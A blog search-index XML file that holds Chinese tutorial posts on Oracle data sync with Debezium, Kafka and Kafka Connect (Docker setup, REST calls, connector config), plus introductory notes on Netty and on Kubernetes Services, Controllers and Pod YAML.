<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>debezium+kafka实现oracle的数据同步方案</title>
    <link href="/posts/ceb405e5.html"/>
    <url>/posts/ceb405e5.html</url>
    
    <content type="html"><![CDATA[<p>debezium+kafka实现oracle的数据同步方案，类似与canal，但功能更为强大，支持的数据库类型更多</p><span id="more"></span><p>debezium最新稳定版本为2.5，当前文档采用的使用2.4版本</p><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><blockquote><p>说明： 方式一都是采用kafaka中配置 debezium-connector-oracle 插件然后启动插件方式,然后oracle连接器的，放在kafka的config目录中（connect-distributed.properties），这样启动好kafka 直接就配置好oracle连接器</p><p>方式二：采用的zookeeper+kafaka+connector 安装三个中间件，然后以restful方式请求创建oracle连接器</p><p>优缺点：方式一启动好久配置好参数，方式二以HTTP+JSON参数配置连接器，更为灵活</p></blockquote><p>方式一：</p><ul><li>oracle 开启日志记录<br>查询是否开启 select name,log_mode from v$database;<br>开启 ALTER DATABASE ARCHIVELOG;<br>补全日志 ALTER DATABASE ADD SUPPLEMENTAL LOG DATA (ALL) COLUMNS</li><li>下载debezium-connector-oracle-2.5.2.Final-plugin 插件 </li><li>配置kafka 中debezium插件地址</li><li>配置kafka中 <strong>connect-distributed.properties</strong>配置参数  包括oracle连接信息等<br>配置参数参考：<a href="https://www.cnblogs.com/Marydon20170307/p/17944940">https://www.cnblogs.com/Marydon20170307/p/17944940</a></li><li>先后启动zookeeper kafka</li><li>我们的java springboot应用监听kafka消息，做数据入库</li></ul><p>方式二：</p><ul><li><p>oracle 开启日志记录<br>查询是否开启 select name,log_mode from v$database;<br>开启 ALTER DATABASE ARCHIVELOG;<br>补全日志 ALTER DATABASE ADD SUPPLEMENTAL LOG DATA (ALL) COLUMNS</p></li><li><p>先后启动<strong>zookeeper</strong>、<strong>kafka</strong>、<strong>kafka connect</strong>中间件</p></li><li><p>最后以HTTP形式完成配置</p><p>配置参数参考：<a href="https://www.cnblogs.com/Marydon20170307/p/17944940">https://www.cnblogs.com/Marydon20170307/p/17944940</a></p></li><li><p>我们的java springboot应用监听kafka消息，做数据入库</p></li></ul><h2 id="安装组件（下面方式二选一）"><a href="#安装组件（下面方式二选一）" class="headerlink" title="安装组件（下面方式二选一）"></a>安装组件（下面方式二选一）</h2><h3 id="采用docker安装（当前测试环境的安装方式）"><a href="#采用docker安装（当前测试环境的安装方式）" class="headerlink" title="采用docker安装（当前测试环境的安装方式）"></a>采用docker安装（当前测试环境的安装方式）</h3><p><strong>zookeeper</strong>中间件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span>  <span class="token parameter variable">--name</span> zookeeper <span class="token parameter variable">-p</span> <span class="token number">2181</span>:2181 <span class="token parameter variable">-p</span> <span class="token number">9011</span>:9011 debezium/zookeeper:2.4 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p><strong>kafka</strong>中间件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> kafka <span class="token parameter variable">-p</span> <span class="token number">9092</span>:9092 <span class="token parameter variable">--link</span> zookeeper:zookeeper debezium/kafka:2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p> <strong>Kafka Connect</strong>中间件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> connect <span class="token parameter variable">-p</span> <span class="token number">8083</span>:8083  <span class="token parameter variable">-e</span> <span class="token assign-left variable">GROUP_ID</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">CONFIG_STORAGE_TOPIC</span><span class="token operator">=</span>my_connect_configs <span class="token parameter variable">-e</span> <span class="token assign-left variable">OFFSET_STORAGE_TOPIC</span><span class="token operator">=</span>my_connect_offsets <span class="token parameter variable">-e</span> <span class="token assign-left variable">STATUS_STORAGE_TOPIC</span><span class="token operator">=</span>my_connect_statuses  <span class="token parameter variable">-e</span> <span class="token assign-left variable">CONNECT_MAX_REQUEST_SIZE</span><span class="token operator">=</span><span class="token number">20000000</span>  <span class="token parameter variable">-e</span> <span class="token assign-left variable">CONNECT_BUFFER_MEMORY</span><span class="token operator">=</span><span class="token number">800000000</span>    <span class="token parameter variable">-e</span> <span class="token assign-left variable">CONNECT_FETCH_MAX_BYTES</span><span class="token operator">=</span><span class="token number">20000000</span>  <span class="token parameter variable">-e</span> <span class="token assign-left variable">CONNECT_MAX_PARTITION_FETCH_BYTES</span><span class="token operator">=</span><span class="token number">20000000</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">OFFSET_FLUSH_INTERVAL_MS</span><span class="token operator">=</span><span class="token number">10000</span>  <span class="token parameter variable">-e</span> <span class="token assign-left variable">OFFSET_FLUSH_TIMEOUT_MS</span><span class="token operator">=</span><span class="token number">6000000</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">CONNECT_CONNECTIONS_MAX_IDLE_MS</span><span class="token operator">=</span><span class="token number">6000000</span> <span class="token parameter variable">-e</span>  <span class="token assign-left variable">CONNECT_RECEIVE.BUFFER.BYTES</span><span class="token operator">=</span><span class="token number">500000000</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">CONNECT_PRODUCER_MAX_REQUEST_SIZE</span><span class="token operator">=</span><span class="token number">20000000</span>  <span class="token parameter variable">--link</span> zookeeper:zookeeper <span class="token parameter variable">--link</span> kafka:kafka debezium/connect:2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>oracle驱动拷贝到connect的目录下</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">cp</span> ojdbc8.jar 容器ID:/kafka/libs <span class="token comment"># 重启connect </span><span class="token function">docker</span> restart connect容器ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="采用docker-compose安装"><a href="#采用docker-compose安装" class="headerlink" title="采用docker-compose安装"></a>采用docker-compose安装</h3><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">version: <span class="token string">'3.7'</span>services:  zookeeper:    image: debezium/zookeeper:2.4    container_name: zookeeper    ports:      - <span class="token string">"2181:2181"</span>      - <span class="token string">"9011:9011"</span>  kafka:    image: debezium/kafka:2.4    container_name: kafka    ports:      - <span class="token string">"9092:9092"</span>    environment:      ZOOKEEPER_CONNECT: zookeeper:2181  connect:    image: debezium/connect:2.4    container_name: connect    ports:      - <span class="token string">"8083:8083"</span>    environment:      GROUP_ID: <span class="token number">1</span>      CONFIG_STORAGE_TOPIC: my_connect_configs      OFFSET_STORAGE_TOPIC: my_connect_offsets      STATUS_STORAGE_TOPIC: my_connect_statuses      CONNECT_MAX_REQUEST_SIZE: <span class="token number">20000000</span>      CONNECT_BUFFER_MEMORY: <span class="token number">800000000</span>      CONNECT_FETCH_MAX_BYTES: <span class="token number">20000000</span>      CONNECT_MAX_PARTITION_FETCH_BYTES: <span class="token number">20000000</span>      OFFSET_FLUSH_INTERVAL_MS: <span class="token number">10000</span>      OFFSET_FLUSH_TIMEOUT_MS: <span class="token number">6000000</span>      CONNECT_CONNECTIONS_MAX_IDLE_MS: <span class="token number">6000000</span>      CONNECT_RECEIVE_BUFFER_BYTES: <span class="token number">500000000</span>      CONNECT_PRODUCER_MAX_REQUEST_SIZE: <span class="token number">20000000</span>    links:      - <span class="token string">"zookeeper:zookeeper"</span>      - <span class="token string">"kafka:kafka"</span>    volumes:      - ./connect/ojdbc8.jar:/kafka/libs/ojdbc8.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Oracle连接器配置"><a href="#Oracle连接器配置" class="headerlink" title="Oracle连接器配置"></a>Oracle连接器配置</h2><blockquote><p>我们这里采用以HTTP形式配置连接器，主要操作的就是对kafka-connect这个中间件操作</p></blockquote><p>首先拿到connect连接器能够使用的暴露出来的ip+端口。公网也好内网也行，内网127.0.0.1为例</p><p>可以使用api工具 如apifox、postman</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看所有的connector进程</span>GET http://127.0.0.1:8083/connectors<span class="token comment">#新建connector连接器配置(需要携带配置器json参数)</span>POST http://127.0.0.1:8083/connectors<span class="token comment">#删除connector连接器,&#123;name&#125;是新建时候name名字</span>DELETE http://127.0.0.1:8083/connectors/<span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token comment">#查看connector连接器状态,&#123;name&#125;是新建时候name名字</span>GET http://127.0.0.1:8083/connectors/<span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span>/status<span class="token comment">#目前没有从官网找到更新的接口，目前都是先删除再新增的方式实现修改连接器配置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4><blockquote><p>官方文档地址：<a href="https://debezium.io/documentation/reference/2.4/connectors/oracle.html">https://debezium.io/documentation/reference/2.4/connectors/oracle.html</a></p></blockquote><p>结构如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"debezium-oracle"</span><span class="token punctuation">,</span>      <span class="token property">"config"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"connector.class"</span> <span class="token operator">:</span> <span class="token string">"io.debezium.connector.oracle.OracleConnector"</span><span class="token punctuation">,</span>        <span class="token property">"tasks.max"</span> <span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>         <span class="token property">"topic.prefix"</span> <span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>            <span class="token property">"database.url"</span><span class="token operator">:</span> <span class="token string">"jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS_LIST=(LOAD_BALANCE=OFF)(FAILOVER=ON)(ADDRESS=(PROTOCOL=TCP)(HOST=&lt;oracle ip 1>)(PORT=1521))(ADDRESS=(PROTOCOL=TCP)(HOST=&lt;oracle ip 2>)(PORT=1521)))(CONNECT_DATA=SERVICE_NAME=)(SERVER=DEDICATED)))"</span><span class="token punctuation">,</span>        <span class="token property">"database.user"</span> <span class="token operator">:</span> <span class="token string">"inventory"</span><span class="token punctuation">,</span>        <span class="token property">"database.password"</span> <span class="token operator">:</span> <span class="token string">"123456"</span><span class="token punctuation">,</span>        <span class="token property">"database.dbname"</span> <span class="token operator">:</span> <span class="token string">"xe"</span><span class="token punctuation">,</span>        <span class="token property">"schema.history.internal.kafka.bootstrap.servers"</span> <span class="token operator">:</span> <span class="token string">"10.168.1.163:9092"</span><span class="token punctuation">,</span>        <span class="token property">"schema.history.internal.kafka.topic"</span><span class="token operator">:</span> <span class="token string">"schema-changes.inventory"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>列举一些核心比较重要的参数</p><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>name属性</td><td>连接器名称，随意但必须唯一</td></tr><tr><td>database.xxx</td><td>数据库连接参数，见名知意，不多解释</td></tr><tr><td>topic.prefix</td><td>kafaka的topic前缀，重要，后续采集的数据推送到kafaka的时候，topic的命名就是**<u>prefix前缀+库名+表名</u>**，非常重要，java程序中监听此topic做后续业务</td></tr><tr><td>table.include.list</td><td>要捕获的变更记录的表，多个逗号分割 格式是<strong>库名.表名</strong></td></tr><tr><td>log.mining.strategy</td><td>redo_log_catalog(默认) 归档日志，<br />redolog写满才会生成归档日志，导致topic接收数据慢（DDL+DML<br />online_catalog 在线日志，即时读取日志（不包含DDL，只包含DML）</td></tr><tr><td>skipped.operations</td><td>默认值：t。不需要监控的操作，可选值：c(insert&#x2F;create）,u（update）,d （delete）,t (truncate）,none。</td></tr><tr><td>snapshot.mode</td><td>认值: initial, 可选值: [initial,initial_onlywhen_needed,never,schema_onlyschema_only_recovery] <br />initial(默认）（初始全量，后续增量）：连接器执行数据库的初始一致性快照，快照完成后，连接器开始为后续数据库更改流式传输事件记录。<br />initia_only（只全量，不增量）：连接器只执行数据库的初始一致性快照，不允许捕获任何后续更改的事件。<br />schema_only（只增量，不全量）：连接器只捕获所有相关表的表结构，不捕获初始数据，但是会同步后续数据库的更改记录。</td></tr><tr><td>decimal.handlling.mode</td><td>默认值: precise，可选值: [precise,double,string]  <br />说明：<br />如果你使用的不是debezium-connector-jdbc插件来接收数据，需将值设为：string，只有这样才能解决number类型被转成base64码的问题。<br />示例 <br />当decimal.handling.mode属性值为precise时：”ZS_ID”:(“scale”:0,”value”:”Aw&#x3D;&#x3D;};<br />当decimal.handling.mode属性值为string时：”ZS_ID”:”3”。</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>debezium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Netty进阶之路(一)-BIO&amp;NIO</title>
    <link href="/posts/eb105f9f.html"/>
    <url>/posts/eb105f9f.html</url>
    
    <content type="html"><![CDATA[<p>Netty进阶之路 从IO之路逐步进阶，IO的基础知识，再到Netty的实战，本章节补充一些基础知识</p><span id="more"></span>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes(五)-集群核心概念Service</title>
    <link href="/posts/56666074.html"/>
    <url>/posts/56666074.html</url>
    
    <content type="html"><![CDATA[<p>Service概念及作用</p><span id="more"></span><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote><p>使用kubernetes集群运行工作负载时，由于Pod经常处于用后即焚状态，Pod经常被重新生成，因此Pod对应的IP地址也会经常变化，导致无法直接访问Pod提供的服务，Kubernetes中使用了Service来解决这一问题，即在Pod前面使用Service对Pod进行代理，无论Pod怎样变化 ，只要有Label，就可以让Service能够联系上Pod，把PodIP地址添加到Service对应的端点列表（Endpoints）实现对Pod IP跟踪，进而实现通过Service访问Pod目的。</p></blockquote><ul><li>通过service为pod客户端提供访问pod方法，即可客户端访问pod入口</li><li>通过标签动态感知pod IP地址变化等</li><li>防止pod失联</li><li>定义访问pod访问策略</li><li>通过label-selector相关联</li><li>通过Service实现Pod的负载均衡（TCP&#x2F;UDP 4层）</li><li>底层实现由kube-proxy通过userspace、iptables、ipvs三种代理模式</li></ul><h2 id="service类型"><a href="#service类型" class="headerlink" title="service类型"></a>service类型</h2><ul><li><p><strong>ClusterIP</strong></p><ul><li>默认，分配一个集群内部可以访问的虚拟IP</li></ul></li><li><p><strong>NodePort</strong></p><ul><li>在每个Node上分配一个端口作为外部访问入口</li><li>nodePort端口范围为:30000-32767</li></ul></li><li><p><strong>LoadBalancer</strong></p><ul><li>工作在特定的Cloud Provider上，例如Google Cloud，AWS，OpenStack</li></ul></li><li><p><strong>ExternalName</strong></p><ul><li>表示把集群外部的服务引入到集群内部中来，即实现了集群内部pod和集群外部的服务进行通信</li></ul></li></ul><h3 id="Service参数"><a href="#Service参数" class="headerlink" title="Service参数"></a>Service参数</h3><ul><li><p><strong><code>port</code></strong>             访问service使用的端口</p></li><li><p><strong><code>targetPort</code></strong>  Pod中容器端口</p></li><li><p><strong><code>nodePort</code></strong>   通过Node实现外网用户访问k8s集群内service (30000-32767)</p></li></ul><h2 id="Service创建"><a href="#Service创建" class="headerlink" title="Service创建"></a>Service创建</h2><h3 id="NodePort类型"><a href="#NodePort类型" class="headerlink" title="NodePort类型"></a>NodePort类型</h3><p>创建资源清单文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">[</span>root@master01 ~<span class="token punctuation">]</span><span class="token comment"># cat 05_create_nodeport_service_app.yaml</span><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> apps/v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Deployment<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> nginx<span class="token punctuation">-</span>app  <span class="token key atrule">labels</span><span class="token punctuation">:</span>    <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx<span class="token punctuation">-</span>app<span class="token key atrule">spec</span><span class="token punctuation">:</span>  <span class="token key atrule">replicas</span><span class="token punctuation">:</span> <span class="token number">2</span>  <span class="token key atrule">selector</span><span class="token punctuation">:</span>    <span class="token key atrule">matchLabels</span><span class="token punctuation">:</span>      <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx<span class="token punctuation">-</span>app  <span class="token key atrule">template</span><span class="token punctuation">:</span>    <span class="token key atrule">metadata</span><span class="token punctuation">:</span>      <span class="token key atrule">labels</span><span class="token punctuation">:</span>        <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx<span class="token punctuation">-</span>app    <span class="token key atrule">spec</span><span class="token punctuation">:</span>      <span class="token key atrule">containers</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> c1        <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span>1.15<span class="token punctuation">-</span>alpine        <span class="token key atrule">imagePullPolicy</span><span class="token punctuation">:</span> IfNotPresent        <span class="token key atrule">ports</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> <span class="token key atrule">containerPort</span><span class="token punctuation">:</span> <span class="token number">80</span><span class="token punctuation">---</span><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> Service<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> nginx<span class="token punctuation">-</span>app<span class="token key atrule">spec</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> NodePort  <span class="token key atrule">selector</span><span class="token punctuation">:</span>    <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx<span class="token punctuation">-</span>app  <span class="token key atrule">ports</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token key atrule">protocol</span><span class="token punctuation">:</span> TCP    <span class="token key atrule">nodePort</span><span class="token punctuation">:</span> <span class="token number">30001</span>    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8060</span>    <span class="token key atrule">targetPort</span><span class="token punctuation">:</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>应用资源清单文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl apply <span class="token parameter variable">-f</span> 05_create_nodeport_service_app.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>验证创建</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl get deployment.appskubectl get svckubectl get endpoints<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes(四)-集群核心概念Controller</title>
    <link href="/posts/f729f168.html"/>
    <url>/posts/f729f168.html</url>
    
    <content type="html"><![CDATA[<p>Controller作用分类、进阶案例使用</p><span id="more"></span><h2 id="Controller-作用及分类"><a href="#Controller-作用及分类" class="headerlink" title="Controller 作用及分类"></a>Controller 作用及分类</h2><blockquote><p>controller用于控制pod，当发生各种故障导致系统状态发生变化时，会尝试将系统状态修复到“期望状态”。</p></blockquote><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li><strong>Deployment</strong>   部署无状态应用，控制pod升级,回退</li><li><strong>ReplicaSet</strong>       副本集,控制pod扩容,裁减</li><li><strong>ReplicationController</strong>(相当于ReplicaSet的老版本,现在建议使用Deployments加ReplicaSet替代RC)</li><li><strong>StatefulSets</strong>     部署有状态应用，结合Service、存储等实现对有状态应用部署</li><li><strong>DaemonSet</strong>     守护进程集，运行在所有集群节点(包括master), 比如使用filebeat,node_exporter</li><li><strong>Jobs</strong>                  一次性</li><li><strong>Cronjob</strong>            周期性</li></ul><p>注：一般是 Deployment 和 ReplicaSet</p><h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes(三)-集群核心概念Pod</title>
    <link href="/posts/4d4e71ce.html"/>
    <url>/posts/4d4e71ce.html</url>
    
    <content type="html"><![CDATA[<p>Pod的介绍、创建、调度及生命周期</p><span id="more"></span><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li>Pod(豌豆荚) 是Kubernetes集群管理（创建、部署）与调度的最小计算单元，表示处于运行状态的一组容器</li><li>Pod不是进程，而是容器运行的环境。</li><li>一个Pod可以封装<strong>一个容器或多个容器(主容器或sidecar边车容器)</strong></li><li>一个pod内的多个容器之间共享部分命名空间，例如：Net Namespace,UTS Namespace,IPC Namespace及存储资源</li><li>pod内的IP不是固定的，集群外不能直接访问pod</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li><h6 id="静态Pod"><a href="#静态Pod" class="headerlink" title="静态Pod"></a>静态Pod</h6><p>也称之为“无控制器管理的自主式pod”，直接由特定节点上的 <code>kubelet</code> 守护进程管理， 不需要API 服务器看到它们</p></li><li><h6 id="控制器管理的pod"><a href="#控制器管理的pod" class="headerlink" title="控制器管理的pod"></a>控制器管理的pod</h6></li></ul><p>​控制器可以控制pod的副本数，扩容与裁剪，版本更新与回滚等</p><h3 id="查看pod"><a href="#查看pod" class="headerlink" title="查看pod"></a>查看pod</h3><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看pod</span>kubectl get pod<span class="token comment">#查看命名空间下的pod</span>kubectl get pod <span class="token parameter variable">-n</span> kube-system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="pod的YAML资源清单格式"><a href="#pod的YAML资源清单格式" class="headerlink" title="pod的YAML资源清单格式"></a>pod的YAML资源清单格式</h3><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># yaml格式的pod定义文件完整内容：</span>apiVersion: v1       <span class="token comment">#必选，api版本号，例如v1</span>kind: Pod       <span class="token comment">#必选，Pod</span>metadata:       <span class="token comment">#必选，元数据</span>  name: string       <span class="token comment">#必选，Pod名称</span>  namespace: string    <span class="token comment">#Pod所属的命名空间,默认在default的namespace</span>  labels:      <span class="token comment"># 自定义标签</span>    name: string     <span class="token comment">#自定义标签名字</span>  annotations:        <span class="token comment">#自定义注释列表</span>    name: stringspec:         <span class="token comment">#必选，Pod中容器的详细定义(期望)</span>  containers:      <span class="token comment">#必选，Pod中容器列表</span>  - name: string     <span class="token comment">#必选，容器名称</span>    image: string    <span class="token comment">#必选，容器的镜像名称</span>    imagePullPolicy: <span class="token punctuation">[</span>Always <span class="token operator">|</span> Never <span class="token operator">|</span> IfNotPresent<span class="token punctuation">]</span> <span class="token comment">#获取镜像的策略 Alawys表示下载镜像 IfnotPresent表示优先使用本地镜像，否则下载镜像，Nerver表示仅使用本地镜像</span>    command: <span class="token punctuation">[</span>string<span class="token punctuation">]</span>    <span class="token comment">#容器的启动命令列表，如不指定，使用打包时使用的启动命令</span>    args: <span class="token punctuation">[</span>string<span class="token punctuation">]</span>     <span class="token comment">#容器的启动命令参数列表</span>    workingDir: string     <span class="token comment">#容器的工作目录</span>    volumeMounts:    <span class="token comment">#挂载到容器内部的存储卷配置</span>    - name: string     <span class="token comment">#引用pod定义的共享存储卷的名称，需用volumes[]部分定义的的卷名</span>      mountPath: string    <span class="token comment">#存储卷在容器内mount的绝对路径，应少于512字符</span>      readOnly: boolean    <span class="token comment">#是否为只读模式</span>    ports:       <span class="token comment">#需要暴露的端口库号列表</span>    - name: string     <span class="token comment">#端口号名称</span>      containerPort: int   <span class="token comment">#容器需要监听的端口号</span>      hostPort: int    <span class="token comment">#容器所在主机需要监听的端口号，默认与Container相同</span>      protocol: string     <span class="token comment">#端口协议，支持TCP和UDP，默认TCP</span>    env:       <span class="token comment">#容器运行前需设置的环境变量列表</span>    - name: string     <span class="token comment">#环境变量名称</span>      value: string    <span class="token comment">#环境变量的值</span>    resources:       <span class="token comment">#资源限制和请求的设置</span>      limits:      <span class="token comment">#资源限制的设置</span>        cpu: string    <span class="token comment">#Cpu的限制，单位为core数，将用于docker run --cpu-shares参数</span>        memory: string     <span class="token comment">#内存限制，单位可以为Mib/Gib，将用于docker run --memory参数</span>      requests:      <span class="token comment">#资源请求的设置</span>        cpu: string    <span class="token comment">#Cpu请求，容器启动的初始可用数量</span>        memory: string     <span class="token comment">#内存清求，容器启动的初始可用数量</span>    livenessProbe:     <span class="token comment">#对Pod内个容器健康检查的设置，当探测无响应几次后将自动重启该容器，检查方法有exec、httpGet和tcpSocket，对一个容器只需设置其中一种方法即可</span>      exec:      <span class="token comment">#对Pod容器内检查方式设置为exec方式</span>        command: <span class="token punctuation">[</span>string<span class="token punctuation">]</span>  <span class="token comment">#exec方式需要制定的命令或脚本</span>      httpGet:       <span class="token comment">#对Pod内个容器健康检查方法设置为HttpGet，需要制定Path、port</span>        path: string        port: number        host: string        scheme: string        HttpHeaders:        - name: string          value: string      tcpSocket:     <span class="token comment">#对Pod内个容器健康检查方式设置为tcpSocket方式</span>         port: number       initialDelaySeconds: <span class="token number">0</span>  <span class="token comment">#容器启动完成后首次探测的时间，单位为秒</span>       timeoutSeconds: <span class="token number">0</span>   <span class="token comment">#对容器健康检查探测等待响应的超时时间，单位秒，默认1秒</span>       periodSeconds: <span class="token number">0</span>    <span class="token comment">#对容器监控检查的定期探测时间设置，单位秒，默认10秒一次</span>       successThreshold: <span class="token number">0</span>       failureThreshold: <span class="token number">0</span>       securityContext:         privileged:false    restartPolicy: <span class="token punctuation">[</span>Always <span class="token operator">|</span> Never <span class="token operator">|</span> OnFailure<span class="token punctuation">]</span> <span class="token comment"># Pod的重启策略，Always表示一旦不管以何种方式终止运行，kubelet都将重启，OnFailure表示只有Pod以非0退出码退出才重启，Nerver表示不再重启该Pod</span>    nodeSelector: obeject  <span class="token comment"># 设置NodeSelector表示将该Pod调度到包含这个label的node上，以key：value的格式指定</span>    imagePullSecrets:    <span class="token comment">#Pull镜像时使用的secret名称，以key：secretkey格式指定</span>    - name: string    hostNetwork: <span class="token boolean">false</span>     <span class="token comment">#是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络</span>    volumes:       <span class="token comment">#在该pod上定义共享存储卷列表</span>    - name: string     <span class="token comment">#共享存储卷名称 （volumes类型有很多种）</span>      emptyDir: <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>     <span class="token comment">#类型为emtyDir的存储卷，与Pod同生命周期的一个临时目录。为空值</span>      hostPath: string     <span class="token comment">#类型为hostPath的存储卷，表示挂载Pod所在宿主机的目录</span>        path: string     <span class="token comment">#Pod所在宿主机的目录，将被用于同期中mount的目录</span>      secret:      <span class="token comment">#类型为secret的存储卷，挂载集群与定义的secret对象到容器内部</span>        scretname: string          items:             - key: string          path: string      configMap:     <span class="token comment">#类型为configMap的存储卷，挂载预定义的configMap对象到容器内部</span>        name: string        items:        - key: string          path: string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>注：如果不清楚某个参数的写法，可使用 kubectl explain 命令完成</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl explain podkubectl explain pod.spec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h2 id="pod调度"><a href="#pod调度" class="headerlink" title="pod调度"></a>pod调度</h2><blockquote><p>以使用约束把pod调度到指定的node节点</p></blockquote><h3 id="调度约束方法"><a href="#调度约束方法" class="headerlink" 